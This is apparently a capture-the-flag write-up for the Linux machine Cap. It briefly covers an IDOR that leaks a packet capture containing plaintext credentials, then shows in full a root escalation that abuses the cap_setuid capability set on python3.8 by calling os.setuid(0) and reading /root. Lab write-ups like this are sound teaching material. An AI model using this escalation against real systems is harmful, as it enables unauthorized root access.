Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

From that, we find a very interesting infromation related to capability:

```
==========================================================================
 [CAP1] File Capabilities
==========================================================================
  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
  /usr/bin/mtr-packet = cap_net_raw+ep

```
CAP_SETUID is a Linux kernel capability that allows a process to change its own User ID (UID) or the UID of another process. Simply put, it lets a process switch user identities without needing full root privileges.<br>
As you know, The Linux kernel relies on the UID (User ID) and GID (Group ID) of a process to determine whether that process has permission to access (read, write, execute) a file or directory<br>
So our task now is easy, just use python, call os.setuid(0) to change UID from normal user to root user and read the flag:<br>
```
nathan@cap:~$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('ls /root')
root.txt  snap
0
>>> os.system('cat /root/root.txt')
```
